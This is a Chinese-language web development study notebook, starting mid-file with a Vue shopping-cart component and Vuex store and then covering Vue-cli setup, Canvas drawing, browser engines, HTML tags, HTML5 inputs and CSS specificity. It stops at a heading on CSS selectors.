      <div class="mui-card" v-for="(item, i) in goodslist" :key="item.id">
				<div class="mui-card-content">
					<div class="mui-card-content-inner">
						
            <mt-switch 
              v-model="$store.getters.getGoodsSelected[item.id]"
              @change="selectedChanged(item.id, $store.getters.getGoodsSelected[item.id])"></mt-switch>
            <img :src="item.thumb_path">
            <div class="info">
              <h1>{{ item.title }}</h1>
              <p>
                <span class="price">￥{{ item.sell_price }}</span>
                <numbox :initcount="$store.getters.getGoodsCount[item.id]" :goodsid="item.id"></numbox>
                <!-- 问题：如何从购物车中获取商品的数量呢 -->
                <!-- 1. 我们可以先创建一个 空对象，然后循环购物车中所有商品的数据， 把 当前循环这条商品的 Id， 作为 对象 的 属性名，count值作为 对象的 属性值，这样，当把所有的商品循环一遍，就会得到一个对象： { 88: 2, 89: 1, 90: 4 } -->
                <a href="#" @click.prevent="remove(item.id, i)">删除</a>
              </p>
            </div>

					</div>
				</div>
			</div>  

    </div>

    <!-- 结算区域 -->
    <div class="mui-card">
				<div class="mui-card-content">
					<div class="mui-card-content-inner jiesuan">
						<div class="left">
              <p>总计（不含运费）</p>
              <p>已勾选商品 <span class="red">{{ $store.getters.getGoodsCountAndAmount.count }}</span> 件， 总价 <span class="red">￥{{ $store.getters.getGoodsCountAndAmount.amount }}</span></p>
            </div>
             <mt-button type="danger">去结算</mt-button>
					</div>
				</div>
			</div>


      <p>{{ $store.getters.getGoodsSelected }}</p>

  </div>
</template>

<script>
import numbox from "../subcomponents/shopcar_numbox.vue";

export default {
  data() {
    return {
      goodslist: [] // 购物车中所有商品的数据
    };
  },
  created() {
    this.getGoodsList();
  },
  methods: {
    getGoodsList() {
      // 1. 获取到 store 中所有的商品的Id，然后拼接出一个 用逗号分隔的 字符串
      var idArr = [];
      this.$store.state.car.forEach(item => idArr.push(item.id));
      // 如果 购物车中没有商品，则直接返回，不需要请求数据接口，否则会报错
      if (idArr.length <= 0) {
        return;
      }
      // 获取购物车商品列表
      this.$http
        .get("api/goods/getshopcarlist/" + idArr.join(","))
        .then(result => {
          if (result.body.status === 0) {
            this.goodslist = result.body.message;
          }
        });
    },
    remove(id, index) {
      // 点击删除，把商品从 store 中根据 传递的 Id 删除，同时，把 当前组件中的 goodslist 中，对应要删除的那个商品，使用 index 来删除
      this.goodslist.splice(index, 1);
      this.$store.commit("removeFormCar", id);
    },
    selectedChanged(id, val) {
      // 每当点击开关，把最新的 快关状态，同步到 store 中
      // console.log(id + " --- " + val);
      this.$store.commit("updateGoodsSelected", { id, selected: val });
    }
  },
  components: {
    numbox
  }
};
</script>

<style lang="scss" scoped>
.shopcar-container {
  background-color: #eee;
  overflow: hidden;
  .goods-list {
    .mui-card-content-inner {
      display: flex;
      align-items: center;
    }
    img {
      width: 60px;
    }
    h1 {
      font-size: 13px;
    }
    .info {
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      .price {
        color: red;
        font-weight: bold;
      }
    }
  }
  .jiesuan {
    display: flex;
    justify-content: space-between;
    align-items: center;
    .red {
      color: red;
      font-weight: bold;
      font-size: 16px;
    }
  }
}
</style>

```
* 配合vuex
```
// 入口文件
import Vue from 'vue'
// 1.1 导入路由的包
import VueRouter from 'vue-router'
// 1.2 安装路由
Vue.use(VueRouter)

// 注册 vuex
import Vuex from 'vuex'
Vue.use(Vuex)

// 每次刚进入 网站，肯定会 调用 main.js 在刚调用的时候，先从本地存储中，把 购物车的数据读出来，放到 store 中
var car = JSON.parse(localStorage.getItem('car') || '[]')

var store = new Vuex.Store({
  state: { // this.$store.state.***
    car: car // 将 购物车中的商品的数据，用一个数组存储起来，在 car 数组中，存储一些商品的对象， 咱们可以暂时将这个商品对象，设计成这个样子   
    // { id:商品的id, count: 要购买的数量, price: 商品的单价，selected: false  }
  },
  mutations: { // this.$store.commit('方法的名称', '按需传递唯一的参数')
    addToCar(state, goodsinfo) {
      // 点击加入购物车，把商品信息，保存到 store 中的 car 上
      // 分析：
      // 1. 如果购物车中，之前就已经有这个对应的商品了，那么，只需要更新数量
      // 2. 如果没有，则直接把 商品数据，push 到 car 中即可

      // 假设 在购物车中，没有找到对应的商品
      var flag = false

      state.car.some(item => {
        if (item.id == goodsinfo.id) {
          item.count += parseInt(goodsinfo.count)
            flag = true
          return true
        }
      })

      // 如果最终，循环完毕，得到的 flag 还是 false，则把商品数据直接 push 到 购物车中
      if (!flag) {
        state.car.push(goodsinfo)
      }

      // 当 更新 car 之后，把 car 数组，存储到 本地的 localStorage 中
      localStorage.setItem('car', JSON.stringify(state.car))
    },
    updateGoodsInfo(state, goodsinfo) {
      // 修改购物车中商品的数量值
      // 分析： 
      state.car.some(item => {
        if (item.id == goodsinfo.id) {
          item.count = parseInt(goodsinfo.count)
          return true
        }
      })
      // 当修改完商品的数量，把最新的购物车数据，保存到 本地存储中
      localStorage.setItem('car', JSON.stringify(state.car))
    },
    removeFormCar(state, id) {
      // 根据Id，从store 中的购物车中删除对应的那条商品数据
      state.car.some((item, i) => {
        if (item.id == id) {
          state.car.splice(i, 1)
          return true;
        }
      })
      // 将删除完毕后的，最新的购物车数据，同步到 本地存储中
      localStorage.setItem('car', JSON.stringify(state.car))
    },
    updateGoodsSelected(state, info) {
      state.car.some(item => {
        if (item.id == info.id) {
          item.selected = info.selected
        }
      })
      // 把最新的 所有购物车商品的状态保存到 store 中去
      localStorage.setItem('car', JSON.stringify(state.car))
    }
  },
  getters: { // this.$store.getters.***
    // 相当于 计算属性，也相当于 filters
    getAllCount(state) {
      var c = 0;
      state.car.forEach(item => {
        c += item.count
      })
      return c
    },
      //得到商品数量
    getGoodsCount(state) {
      var o = {}
      state.car.forEach(item => {
        o[item.id] = item.count
      })
      return o
    },
    getGoodsSelected(state) {
      var o = {}
      state.car.forEach(item => {
        o[item.id] = item.selected
      })
      return o
    },
    getGoodsCountAndAmount(state) {
      var o = {
        count: 0, // 勾选的数量
        amount: 0 // 勾选的总价
      }
      state.car.forEach(item => {
        if (item.selected) {
          o.count += item.count
          o.amount += item.price * item.count
        }
      })
      return o
    }
  }
})

// 导入格式化时间的插件
import moment from 'moment'
// 定义全局的过滤器
Vue.filter('dateFormat', function (dataStr, pattern = "YYYY-MM-DD HH:mm:ss") {
  return moment(dataStr).format(pattern)
})

// 2.1 导入 vue-resource
import VueResource from 'vue-resource'
// 2.2 安装 vue-resource
Vue.use(VueResource)
// 设置请求的根路径
Vue.http.options.root = 'http://vue.studyit.io';
// 全局设置 post 时候表单数据格式组织形式   application/x-www-form-urlencoded
Vue.http.options.emulateJSON = true;


// 导入 MUI 的样式
import './lib/mui/css/mui.min.css'
// 导入扩展图标样式
import './lib/mui/css/icons-extra.css'


// 按需导入 Mint-UI 中的组件   
/* import { Header, Swipe, SwipeItem, Button, Lazyload } from 'mint-ui'
Vue.component(Header.name, Header)
Vue.component(Swipe.name, Swipe)
Vue.component(SwipeItem.name, SwipeItem)
Vue.component(Button.name, Button)
Vue.use(Lazyload); */
import MintUI from 'mint-ui'
Vue.use(MintUI)
import 'mint-ui/lib/style.css'


// 安装 图片预览插件
import VuePreview from 'vue-preview'
Vue.use(VuePreview)


// 1.3 导入自己的 router.js 路由模块
import router from './router.js'


// 导入 App 根组件
import app from './App.vue'

var vm = new Vue({
  el: '#app',
  render: c => c(app),
  router, // 1.4 挂载路由对象到 VM 实例上
  store // 挂载 store 状态管理对象
})
```
>[success] # 配合Vue-cli 创建项目
```
1.上面使用了自定义的webpack 去安装使用一个Vue 项目的搭建，现在使用
2.使用vue脚手架做的操作安装node.js，安装webpack和webpack-dev-server
```
* 使用脚手架
```
1.npm install -g vue-cli -- 引入vue脚手架
2.vue init webpack my-project -- 用webpack初始化一个项目，需要注意的是
项目的名称不能大写，“不能用中文”,不然会报错，初始化项目的选项：
  1. Project name :项目名称 ，如果不需要更改直接回车就可以了。注意：这里不能使用大写。
  2. Project description:项目描述，默认为A Vue.js project,直接回车，不用编写。
  3. Author：作者，如果你有配置git，他会读取.ssh文件中的user。
  4. Install vue-router? 是否安装vue的路由插件，Y代表安装，N无需安装，下面的命令也是一样的。
  5. Use ESLint to lint your code? 是否用ESLint来限制你的代码错误和风格（超级严格）
  6. setup unit tests with Karma + Mocha? 是否需要安装单元测试工具Karma+Mocha。
  7. Setup e2e tests with Nightwatch?是否安装e2e来进行用户行为模拟测试。
  8. Should we run npm install for you after the project has been created?(recommended)npm
     询问你使用npm安装还是yarn安装包依赖，我这里选择的是npm，yarn更快更好，使用yarn之前确保你的电脑已经安装yarn。
3.npm install -- 安装项目依赖(package.json)
4.npm start或 npm run dev --项目启动指令参考在(package.json)配置
```
>[danger] ##### 简单的初识
```
1.文件的导入例如import Vue from 'vue'和node.js 中 var Vue= require('Vue') 等同
的，不同点，第一个是es6模块化的导入，第二个是commonJs 的导入，但作用相
同，一开始去node_modules 文件去找包
2.入口文件main.jsnew Vue({
  el: '#app',
  // import App from './App'
  components: { App },
  // 上面的文件引入等同于下面的引入方式，但让组件模块化方便维护
  // components:{
  //   App:{
  //     template:"",
  //     data() {
  //       return {}
  //     }
  //   }
  // },
  template: '<App/>'
})
3.es6 模块 导出方式export default  ，在commonJs 中也就是node.js中使用的exports.name
4.style标签 加上scoped属性，css局部生效style标签 加上lang="scss"，支持scss (cnpm 
install --save-dev node-sass sass-loader) 
```
# Canvas
>canvas 最早由Apple引入WebKit,用于Mac OS X 的 Dashboard,后来又在Safari和Google Chrome被实现。 
>基于 Gecko 1.8的浏览器,比如 Firefox 1.5, 同样支持这个元素。  
>&lt;canvas&gt; 元素是WhatWG Web applications 1.0规范的一部分,也包含于HTML 5中。  

### 体验Canvas

#### 什么是Canvas？
HTML5 的 canvas 元素使用 JavaScript 在网页上绘制图像。  
画布是一个矩形区域，您可以控制其每一像素。  
canvas 拥有多种绘制路径、矩形、圆形、字符以及添加图像的方法。

#### 创建Canvas元素 
向 HTML5 页面添加 canvas 元素。  
规定元素的 id、宽度和高度：
```html
    <canvas id="myCanvas" width="200" height="100"></canvas>
```
#### Canvas坐标系
![](images/location.jpg)

#### 通过JavaScript来绘制
```javascript
    /*获取元素*/
    var myCanvas = document.querySelector('#myCanvas');
    /*获取绘图工具*/
    var context = myCanvas.getContext('2d');
    /*设置绘图的起始位置*/
    context.moveTo(100,100);
    /*绘制路径*/
    context.lineTo(200,200);
    /*描边*/
    context.stroke();
```

### Canvas的基本使用

#### 图形绘制
需要理解些概念：  
- 路径的概念
- 路径的绘制
    + 描边 stroke()  
    + 填充 fill()  
      ![](images/path.jpg)  
- 闭合路径
    + 手动闭合
    + 程序闭合 closePath()
- 填充规则(非零环绕)  
  ![](images/zero.jpg)
- 开启新的路径 beginPath()

#### 设置样式
- 画笔的状态
    + lineWidth 线宽，默认1px
    + lineCap 线末端类型：(butt默认)、round、square 
    + lineJoin 相交线的拐点 miter(默认)、round、bevel
    + strokeStyle 线的颜色
    + fillStyle 填充颜色
    + setLineDash() 设置虚线
    + getLineDash() 获取虚线宽度集合
    + lineDashOffset 设置虚线偏移量（负值向右偏移）

#### 实例练习
- 渐变色绘制
- 镂空的房子
- 绘制坐标网格
- 绘制坐标系
- 绘制坐标点
- 绘制折线图

#### 参考文档
- [w3school](http://www.w3school.com.cn/tags/html_ref_canvas.asp)
- [Canvas_API](https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API/Tutorial)

### Canvas图形绘制

#### 矩形绘制
- rect(x,y,w,h) 没有独立路径
- strokeRect(x,y,w,h) 有独立路径，不影响别的绘制
- fillRect(x,y,w,h) 有独立路径，不影响别的绘制
- clearRect(x,y,w,h) 擦除矩形区域

#### 圆弧绘制
- 弧度概念
- arc()
    + x 圆心横坐标
    + y 圆心纵坐标
    + r 半径
    + startAngle 开始角度
    + endAngle 结束角度
    + anticlockwise 是否逆时针方向绘制（默认false表示顺时针；true表示逆时针）

#### 绘制文本
- ctx.font = '微软雅黑' 设置字体
- strokeText()
- fillText(text,x,y,maxWidth)
    + text 要绘制的文本
    + x,y 文本绘制的坐标（文本左下角）
    + maxWidth 设置文本最大宽度，可选参数
- ctx.textAlign文本水平对齐方式，相对绘制坐标来说的
    + left
    + center
    + right
    + start 默认
    + end
    + direction属性css(rtl ltr) start和end于此相关
        - 如果是ltr,start和left表现一致
        - 如果是rtl,start和right表现一致
- ctx.textBaseline 设置基线（垂直对齐方式  ）
    + top 文本的基线处于文本的正上方，并且有一段距离
    + middle 文本的基线处于文本的正中间
    + bottom 文本的基线处于文本的证下方，并且有一段距离
    + hanging 文本的基线处于文本的正上方，并且和文本粘合
    + alphabetic 默认值，基线处于文本的下方，并且穿过文字
    + ideographic 和bottom相似，但是不一样
- measureText() 获取文本宽度obj.width

#### 实例练习
- 绘制扇形
- 绘制圆角矩形
- 绘制圆
- 绘制饼图

### 做动画
#### 绘制图片
- drawImage()
    + 三个参数drawImage(img,x,y)
        - img 图片对象、canvas对象、video对象
        - x,y 图片绘制的左上角
    + 五个参数drawImage(img,x,y,w,h)
        - img 图片对象、canvas对象、video对象
        - x,y 图片绘制的左上角
        - w,h 图片绘制尺寸设置(图片缩放，不是截取)
    + 九个参数drawImage(img,x,y,w,h,x1,y1,w1,h1)
        - img 图片对象、canvas对象、video对象
        - x,y,w,h 图片中的一个矩形区域
        - x1,y1,w1,h1 画布中的一个矩形区域

#### 序列帧动画
- 绘制精灵图
- 动起来
- 控制边界
- 键盘控制

#### 坐标变换
- 平移 移动画布的原点
    + translate(x,y) 参数表示移动目标点的坐标
- 缩放
    + scale(x,y) 参数表示宽高的缩放比例
- 旋转
    + rotate(angle) 参数表示旋转角度



​    




>[success] # 常见的浏览器介绍
<a href="http://tongji.baidu.com/data/browser">浏览器份额</a>
```
浏览器是网页运行的平台，常用的浏览器有IE、火狐（Firefox）、
谷歌（Chrome）、Safari和Opera等。我们平时称为五大浏览器。
```
>[danger] ##### 浏览器内核
```
浏览器内核又可以分成两部分：渲染引擎(layout engineer 或者 Rendering Engine)和 JS 引擎。
渲染引擎 它负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。
JS 引擎 则是解析 Javascript 语言，执行 javascript语言来实现网页的动态效果。

最开始渲染引擎和 JS 引擎并没有区分的很明确，后来 JS 引擎越来越独立，内核就倾向于只指渲染引擎。有一个网页标准计划小组制作了一个 ACID 来测试引擎的兼容性和性能。内核的种类很多，如加上没什么人使用的非商业的免费内核，可能会有10多种，但是常见的浏览器内核可以分这四种：Trident、Gecko、Blink、Webkit。
```
>[danger] ##### 内核代表浏览器
```
1.Trident(IE内核) 代表： IE、傲游、世界之窗浏览器、Avant、腾讯TT、猎
豹安全浏览器、360极速浏览器、百度浏览器等。
2.Gecko(firefox) 代表：Mozilla FireFox(火狐浏览器) 采用该内核
3.webkit(Safari)  代表：傲游浏览器3、 Apple Safari 
(Win/Mac/iPhone/iPad)、Symbian手机浏览器、Android 默认浏览器，
4.Chromium/Bink(chrome)  代表：谷歌
5.Presto(Opera)  代表：opera
```
>[danger] ##### 移动端代表
```
目前移动设备浏览器上常用的内核有 Webkit，Blink，Trident，Gecko 等
，其中 iPhone 和 iPad 等苹果 iOS 平台主要是 WebKit，Android 4.4 之前的 
Android 系统浏览器内核是 WebKit，Android4.4 系统浏览器切换到了
Chromium，内核是 Webkit 的分支 Blink，Windows Phone 8 系统浏览器内
核是 Trident。
```
>[success] # 了解html
* 基本骨架
```
<HTML>   
    <head>     
        <title></title>
    </head>
    <body>
    </body>
</HTML>
```
>[danger] ##### 骨架中存放的内容
```
1.HTML标签:是所有的一个根节点。
2.head标签:用于存放：title(必须有的是网页的标题),meta,base,style,script,link
3.body标签：页面在的主体部分，用于存放所有的HTML标签：
```
>[danger] ##### 文档类型
```
1.<!DOCTYPE html> 生是一个html5的页面
```
>[danger] ##### 字符集
```
<meta charset="UTF-8">
1.utf-8是目前最常用的字符集编码方式，常用的字符集编码方式还有gbk和gb2312。
2.gb2312 简单中文  包括6763个汉字（国标）
3.BIG5   繁体中文 港澳台等用
3.GBK包含全部中文字符是GB2312的扩展，加入对繁体字的支持，兼容GB2312
4.UTF-8则包含全世界所有国家需要用到的字符
```
>[danger] ##### 编写原则
```
1.先确定语义的HTML ，再选合适的CSS。
```
>[success] # 认识路径
```
1.相对路径
2.绝对路径
```
>[danger] ##### 相对路径 -- 相对于当前文件本身查找路径
```
1. 图像文件和HTML文件位于同一文件夹：只需输入图像文件的名称即可，如&lt;img src="logo.gif" /&gt;。
2. 图像文件位于HTML文件的下一级文件夹：输入文件夹名和文件名，之间用“/”隔开，如&lt;img src="img/img01/logo.gif" /&gt;。
3. 图像文件位于HTML文件的上一级文件夹：在文件名之前加入“../” ，如果是上两级，则需要使用 “../ ../”，以此类推，如&lt;img src="../logo.gif" /&gt;。
```
 >[danger] #### 绝对路径
```
1.完整的地址
```
>[success] # 编译器快捷键
```
1. 生成标签 直接输入标签名 按tab键即可   比如  div   然后tab 键， 就可以生成 <div></div>
2. 如果想要生成多个相同标签  加上 * 就可以了 比如   div*3  就可以快速生成3个div
3. 如果有父子级关系的标签，可以用 >  比如   ul > li就可以了
4. 如果有兄弟关系的标签，用  +  就可以了 比如 div+p  
5. 如果生成带有类名或者id名字的，  直接写  .demo  或者  #two   tab 键就可以了
```
[TOC]
 
>[success] # HTML 标签
```
1.语义是否良好： 当我们去掉CSS之后，网页结构依然组织有序，并且有良好的可读性。
2.不管是谁都能看懂这块内容是什么。
3.遵循的原则：先确定语义的HTML ，再选合适的CSS。
```
>[success] # 排版标签
```
1.排版标签主要和css搭配使用，显示网页结构的标签，是网页布局最常用的标签。
```
```
1.<hn> 标题文本</hn>  --- 作为标题使用，并且依据重要性递减（1-6）
2.<p>文本内容 </p>    --- 作为段落使用，就像写作可以将段落中换行的内容以换行的形式展示
3.<hr />是单标签      --- 在网页中显示默认样式的水平线。
4.<br />是单标签      --- 强制换行文字会从左到右依次排列，直到浏览器窗口的右端，然后自动换行。如果希望某段文本强制换行显示，就需要使用换行标签
5.<div>没有语义的盒子</div>   --- 没有语义的盒子
6.<span>没有语义的盒子</span> --- 没有语义的盒子
```
![](https://box.kancloud.cn/9bbb1707625ce454b3f00408e4aa75d6_788x328.png)
>[success] # 文本标签
```
1.在网页中，有时需要为文字设置粗体、斜体或下划线效果，这时就需要用
到HTML中的文本格式化标签，使文字以特殊的方式显示。
```
```
1.<b>加粗</b> <strong>加粗</strong>  --- 文字加粗推荐 strong 语义化
2.<i>倾斜</i><em>倾斜</em>  --- 文字倾斜推荐em
3.<s>加删除线</s><del>加删除线</del> --- 加删除线推荐del
4.<u>加下划线</u><ins>加下滑线</ins> --- 推荐使用ins
```
>[success] # 图片标签 -- img
```
1.<img/> 是一个单标签 --- 是用来展示图片效果的
```
* img 标签中的属性
![](https://box.kancloud.cn/0e8fbb543567d0bfcd2dfe6209536699_756x253.png)
>[success] # 连接标签 -- a标签
```
1.<a href="跳转目标" target="目标窗口的弹出方式">文本或图像</a>
*href：用于指定链接目标的url地址，当为标签应用href属性时，它就具有了超链接的功能。
*target：用于指定链接页面的打开方式，其取值有_self和_blank两种，其中_self为默认在当前窗口打开，_blank为在新窗口中打开方式。
```
>[danger] ##### 锚点属性
```
1.使用“a href=”#id名>“链接文本"</a>创建链接文本。
2.使用相应的id名标注跳转目标的位置。
```
>[danger] ##### 设置base 控制整个页面a标签是否开启新页面
```
1.base 可以设置整体链接的打开状态   
```
![](https://box.kancloud.cn/65b1dde338fcda567ddafa2ec91eaba3_557x52.png)
>[success] # 列表标签
```
1.无序列表   --<ul><li></li><ul>
2.有序列表   -- <ol><li></li><ol>
3.自定义列表 -- <dl><dt>标题</dt><dd>详细内容</dd></dl>
```
>[danger] ##### 应用场景
* ul
![](https://box.kancloud.cn/74151f29c34db628b079294c940f30f0_454x181.png)
* ol
![](https://box.kancloud.cn/26dc085d76653b71969c9594ac859d25_579x106.png)
* dl
![](https://box.kancloud.cn/58d67bc496356e120960c6eff6bddcb8_351x77.png)
>[success] # 表格 -- Table
```
1.数据展示的容器，tr 为行，td为列，th为表头标签，thead用于定义表格的
头部，tbody用于定义表格的头部
2.跨行合并：rowspan    跨列合并：colspan
3.<caption>table的标题属性</caption>
合并单元格的思想：
将多个内容合并的时候，就会有多余的东西，把它删除。例如 把 3个 td 合并成一个， 那就多余了2个，需要删除。
公式：  删除的个数  =  合并的个数  - 1   
<table>
  <tr>
    <td>单元格内的文字</td>
    ...
  </tr>
  ...
</table>
```
* 常见属性
```
1.border -- 做整个table的边框设置
2.cellspacing  -- 设置td 之间的距离
3.cellpadding -- 设置单元格的内边距
4.width -- 设置table 的宽度可以设置百分百
5.height -- 设置table 的高度
6.align --  设置table的位置
<table border="1" cellpadding="5" cellspacing="0" width="100%">
    <tr>
        <td>第一列</td>
        <td>第二列</td>
        <td>第三列</td>
    </tr>
</table>
7.border-collapse:collapse 这个不属于table但是可以合并边框
```
![](https://box.kancloud.cn/7d672fb6ba1ac2b6f7b3fa5a9f142ab1_749x389.png)
>[success] # HTML 的特殊字符
![](https://box.kancloud.cn/d27f9f1ef3bf3c425d0da8e00c3bf383_765x345.png)
>[success] # 表单标签 -- input
```
1.spellcheck="true"  -- 检查单词是否正确
2.当使用checkbox 和 radio 的时候使用name 属性作为一组标记
```
![](https://box.kancloud.cn/d4f65935bb544ab6e3c3f410c2765bb2_774x374.png)
>[danger] ##### label标签
```
1.用于绑定一个表单元素, 当点击label标签的时候, 被绑定的表单元素就会获得输入焦点
```
```
1.label 的for 属性绑定的是 input 的id名称
<label for="male">Male</label>
<input type="radio" name="sex" id="male" value="male">
```
>[danger] ##### 文本域 -- textarea
```
1.如果需要输入大量的信息，就需要用到textarea&gt;标签。通过textarea控件可以轻松地创建多行文本输入框，其基本语法格式如下：
<textarea cols="每行中的字符数" rows="显示的行数">
  文本内容
</textarea>
```
 >[success] # 下拉菜单 -- select
```
1.select -- 下拉菜单
2. <select></select>;中至少应包含一对<option></option>。
3. 在option 中定义selected =" selected "时，当前项即为默认选中项。
```
>[success] # 表单域 -- form
```
1.<form action="url地址" method="提交方式" name="表单名称">
  各种表单控件
</form>
常用属性：
1. Action
   在表单收集到信息后，需要将信息传递给服务器进行处理，action属性用于指定接收并处理表单数据的服务器程序的url地址。
2. method
   用于设置表单数据的提交方式，其取值为get或post。
3. name
   用于指定表单的名称，以区分同一个页面中的多个表单。
注意：  每个表单都应该有自己表单域。
```
>[success] # HTML5
* 详细内容看之前html5总结
```
1.	万维网的核心语言、标准通用标记语言下的一个应用超文本标记语言（HTML）的第五次重大修改
2.	支持Html5的浏览器包括Firefox（火狐浏览器），IE9及其更高版本，Chrome（谷歌浏览器），Safari，Opera等；国内的傲游浏览器（Maxthon），以及基于IE或Chromium（Chrome的工程版或称实验版）所推出的360浏览器、搜狗浏览器、QQ浏览器、猎豹浏览器等国产浏览器同样具备支持HTML5的能力
3.	HTML5的设计目的是为了在移动设备上支持多媒体。新的语法特征被引进以支持这一点，如video、audio和canvas 标记。HTML5还引进了新的功能，可以真正改变用户与文档的交互方式
4.	增加了新特性：语义特性，本地存储特性，设备兼容特性，连接特性，网页多媒体特性，三维、图形及特效特性，性能与集成特性，CSS3特性
5.	相比之前的进步：取消了一些过时的HTML4标记，将内容和展示分离，一些全新的表单输入对象，全新的，更合理的Tag，本地数据库，Canvas 对象，浏览器中的真正程序，Html5取代Flash在移动设备的地位
6.	优点：
    a)	提高可用性和改进用户的友好体验；
    b)	有几个新的标签，这将有助于开发人员定义重要的内容；
    c)	可以给站点带来更多的多媒体元素(视频和音频)；
    d)	可以很好的替代FLASH和Silverlight；
    e)	当涉及到网站的抓取和索引的时候，对于SEO很友好；
    f)	将被大量应用于移动应用程序和游戏；
    g)	可移植性好。
7.	缺点：该标准并未能很好的被Pc端浏览器所支持。因新标签的引入，各浏览器之间将缺少一种统一的数据描述格式，造成用户体验不佳。
8.	未来趋势
    a)	移动优先
    b)	游戏开发者领衔“主演”
```
>[success] # 常见的布局标签
* <a href="http://www.w3school.com.cn/html5/html5_reference.asp">更多详情查看</a>
```
<header> 语义 :定义页面的头部  页眉</header>
<nav>  语义 :定义导航栏 </nav> 
<footer>   定义 页面底部 页脚</footer>
<article> 语义:  定义文章</article>
<section> 语义： 定义区域</section>
<aside> 语义： 定义其所处内容之外的内容 侧边</aside>
```
>[success] # 增加的input 属性
* autocomplete 在from表单提交后，再次输入的时候，会出现上次输入的关联提示

| 属性       | 用法                                 | 含义                      |
| -- |--  |--  |
| placeholder  |  &lt;input type="text" placeholder="请输入用户名"&gt; | 占位符提供可描述输入字段预期值的提示信息    |
| autofocus  | &lt;input type="text" autofocus&gt;                  | 规定当页面加载时 input 元素应该自动获得焦点 |
| multiple    | &lt;input type="file" multiple&gt;                  | 多文件上传                                  |
| autocomplete | &lt;input type="text" autocomplete="off"&gt;         | 规定表单是否应该启用自动完成功能            |
| required   | &lt;input type="text" required&gt;                   | 必填项                                    |
| accesskey   | &lt;input type="text" accesskey="s"&gt;              | 规定激活（使元素获得焦点）元素的快捷键      |

>[success] # input增加的类型
| 类型     | 使用示例     | 含义        |
| ---------------- | ----------------------- | -------------------- |
| email    | &lt;input type="email"&gt;      | 输入邮箱格式         |
| tel      | &lt;input type="tel"&gt;       | 输入手机号码格式     |
| url      | &lt;input type="url"&gt;       | 输入url格式          |
| number   | &lt;input type="number"&gt;     | 输入数字格式         |
| search   | &lt;input type="search"&gt;    | 搜索框（体现语义化） |
| range    | &lt;input type="range"&gt;      | 自由拖动滑块         |
| time     | &lt;input type="time"&gt;      |          小时 分钟            |
| date     | &lt;input type="date"&gt;       |           获得年月日           |
| datetime | &lt;input type="datetime"&gt;   |                      |
| month   | &lt;input type="month"&gt;     |   月                   |
| week     | &lt;input type="week"&gt;       |        周              |
>[success] # css
<a href="http://css.doyoe.com/">css 样式查询</a>
```
注明：编写页面的时候语义是否良好， 当我们去掉CSS之后，网页结构依然组织有序，并且有良好的可读性。
1.CSS通常称为CSS样式表或层叠样式表（级联样式表），主要用于设置HTML
页面中的文本内容（字体、大小、对齐方式等）、图片的外形（宽高、边框样
式、边距等）以及版面的布局等外观显示样式。
2.CSS以HTML为基础，提供了丰富的功能，如字体、颜色、背景的控制及整体
排版等，而且还可以针对不同的浏览器设置不同的样式
```
>[success] # css 规范
```
```
>[success] # css样式表
```
1.内联样式
2.内部样式
3.外部样式
```
>[danger] ##### 内联样式
```
1.是通过标签的style属性来设置元素的样式，其基本语法格式如下：
2.语法中style是标签的属性，实际上任何HTML标签都拥有style属性，用来设置行
内式。其中属性和值的书写规范与CSS样式规则相同，行内式只对其所在的标签
及嵌套在其中的子标签起作用

案例：
<标签名 style="属性1:属性值1; 属性2:属性值2; 属性3:属性值3;"> 内容 </标签名>
```
>[danger] ##### 内部样式表（内嵌式）
```
1.内嵌式是将CSS代码集中写在HTML文档的head头部标签中，并且用style标签
定义，其基本语法格式如下：

<head>
<style type="text/CSS">
    选择器 {属性1:属性值1; 属性2:属性值2; 属性3:属性值3;}
</style>
</head>
```
>[danger] ##### 外部样式表（外链式）
```
1.链入式是将所有的样式放在一个或多个以.CSS为扩展名的外部样式表文件中，
通过link标签将外部样式表文件链接到HTML文档中，其基本语法格式如下：
<head>
  <link href="CSS文件的路径" type="text/CSS" rel="stylesheet" />
</head>
```
* link 单标签内部属性的解释
```
href：定义所链接外部样式表文件的URL，可以是相对路径，也可以是绝对路径。
type：定义所链接文档的类型，在这里需要指定为“text/CSS”，表示链接的外部文件为CSS样式表。
rel：定义当前文档与被链接文档之间的关系，在这里需要指定为“stylesheet”，表示被链接的文档是一个样式表文件。
```
>[success] # css 三大特性
```
1.css 层叠性
2.css 继承性
3.css 优先性
```
>[danger] ##### 层叠性
```
1.多重css 样式叠加的时候，简单的说当修饰同一个的样式权重一致，浏览器
会自上而下，只加载最后一个
```
>[danger] ##### 继承性
```
1.写CSS样式表时，子标签会继承父标签的某些样式，如文本颜色和字号。想
要设置一个可继承的属性，只需将它应用于父元素即可。
```
* 解释
```
继承性发生的前提是包含（嵌套关系）
   ★文字颜色可以继承
   ★文字大小可以继承
   ★字体可以继续
   ★字体粗细可以继承
   ★文字风格可以继承
   ★行高可以继承
h系列不能继承文字大小。
a标签不能继承文字颜色。
```
>[danger] ##### css 优先级
```
1.权重大的样式修饰，即使在权重小的前面先调用，也是只会显示大的权重
样式
```
* 权重解释
```
1.关于CSS权重，我们需要一套计算公式来去计算，这个就是 CSS 
Specificity，我们称为CSS 特性或称非凡性，它是一个衡量CSS值优先级
的一个标准 具体规范入如下
2.权重没有进制的概念的，也就是即使你的权重是0，0，0，100 也比0，0，1，0的要小
```
|权重类型|权重值|解释|
|-|-|-|
|继承或者* 的贡献值|0,0,0,0|权重值最低，稍微有点背景的都能干掉他|
|每个元素（标签）贡献值|0,0,0,1|权重第二小|
|每个类，伪类贡献值为|0,0,1,0|类和伪类是同级别第三小的|
|每个ID贡献值为|0,1,0,0|级别正数排行第三|
|每个行内样式贡献值|1,0,0,0|级别虽然高但不推荐使用|
|每个!important贡献值|∞ 无穷大|级别最高|
* 解释说明案例
```
div ul  li   ------>      0,0,0,3
.nav ul li   ------>      0,0,1,2
a:hover      -----—>      0,0,1,1
.nav a       ------>      0,0,1,1   
#nav p       ----->       0,1,0,1
```
* 文字说明权重大小
```
1. 使用了 !important声明的规则。
2. 内嵌在 HTML 元素的 style属性里面的声明。
3. 使用了 ID 选择器的规则。
4. 使用了类选择器、属性选择器、伪元素和伪类选择器的规则。
5. 使用了元素选择器的规则。
6. 只包含一个通用选择器的规则。
```
[TOC]

 
>[success] # css选择器
```
1.标签选择器
2.类选着器
3.id选着器
4.通配符选择器
5.伪类选择器
```
>[danger] ##### 标签选择器
```
